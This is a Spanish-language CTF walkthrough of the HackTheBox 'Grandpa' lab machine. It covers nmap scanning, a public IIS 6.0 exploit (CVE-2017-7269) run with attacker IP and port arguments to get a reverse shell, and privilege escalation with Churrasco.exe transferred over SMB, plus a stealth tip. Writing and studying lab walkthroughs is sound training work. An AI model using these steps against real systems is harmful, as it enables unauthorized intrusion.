---
published: true
title: HackTheBox - Grandpa [WriteUp OSCP style]
date: '2021-11-04'
category: HackTheBox
description: WriteUp de la Máquina Grandpa de HackTheBox (Extrapolable a la máquina Granny)
---

![image-center](/assets/images/Grandpa_HTB/info.PNG)

## Reconocimiento inicial
Comenzaremos realizando un escaneo con ```nmap``` mediante el siguiente comando para la enumeración de puertos de la máquina

```bash
nmap -p- -sS --min-rate 5000 --open -n -Pn -vvv 10.10.10.242 -oG allports
```

![image-center](/assets/images/Grandpa_HTB/nmap-ports.PNG)

Obteniendo como resultado que el puerto 80 de la máquina está abierto. Luego procederemos a escanear las versiones y scripts con nmap a este puerto para recopilar más información aún.

![image-center](/assets/images/Grandpa_HTB/nmap-version.PNG)

Encontrando que el servidor web ejecuta un IIS 6.0 el cual es vulnerable a varios CVE.
Ingresando a la página en cuestión y utilizando Wappalyzer para buscar más información, no encontramos mucho más de lo que ya encontramos con el escaneo de versiones.

![image-center](/assets/images/Grandpa_HTB/web-inicial.PNG)

Por lo que procederemos a buscar algún CVE que nos sea de utilidad para conseguir una reverse shell.

## Reverse Shell

Después de un rato buscando se llegó al [CVE-2017-7269](https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269) el cual permite realizar una Reverse Shell a nuestro equipo de atacante.

![image-center](/assets/images/Grandpa_HTB/exploit-CVE-2017-7269.PNG)

Para ello clonamos el repositorio en nuestro directorio de trabajo, nos metemos en el directorio y ejecutamos la vulnerabilidad de la siguiente forma

```bash
python <nombre_exploit> <ip_target> <port_target> <ip_nuestra> <port_nuestro>
```

![image-center](/assets/images/Grandpa_HTB/revshell.PNG)

## Escalación de privilegios

Una vez dentro se intentó ir al directorio Harry quien posiblemente contenga la user-flag, sin embargo, no se pudo acceder.

![image-center](/assets/images/Grandpa_HTB/access-denied.PNG)

por lo que se procedio a ver que privilegios existen dentro de la máquina, encontrando que el SeImpersonatePrivilege está habilitado.

![image-center](/assets/images/Grandpa_HTB/whoami-priv.PNG)

Cuando este privilegio esta activado podemos ejecutar una herramienta para escalar privilegios que se llama JuicyPotato, sin embargo, la versión del Windows que estamos trabajando es Windows Server 2003.
Lo cual nos impide ejecutar el JuicyPotato por compatibilidad de las versiones. Para estos casos es que existe una herramienta similar llamada Churrasco.exe.

![image-center](/assets/images/Grandpa_HTB/churrasco.PNG)

Esta herramienta la podemos descargar desde [https://github.com/Re4son/Churrasco/raw/master/churrasco.exe](https://github.com/Re4son/Churrasco/raw/master/churrasco.exe), luego es necesario compartirla a la máquina objetivo.
Para ello se utilizó impacket con smb-server

![image-center](/assets/images/Grandpa_HTB/smb-traspaso.PNG)

Por temas de sigilo es recomendable, en general, trabajar en la carpeta temporal de las máquinas objetivos ya que suelen tener más permisos en general o suelen borrar la data que contienen al apagarse.

![image-center](/assets/images/Grandpa_HTB/transferencia-success.PNG)

## Flags

Una vez realizado lo anterior ya podemos ejecutar el binario, esto lo podemos hacer ejecutando el binario, agregando la flag "-d" y entre comillas indicando el comando a ejecutar.

![image-center](/assets/images/Grandpa_HTB/churrasco-ejecucion.PNG)

Con esto podríamos obtener una reverse shell como root a nuestra maquina subiendo un binario de Netcat, sin embargo, yo prefiero ir directamente por las banderas ya que podemos intuir donde están, ya que esto es un CTF.

### user.txt

![image-center](/assets/images/Grandpa_HTB/user-flag.PNG)

### root.txt

![image-center](/assets/images/Grandpa_HTB/root-flag.PNG)
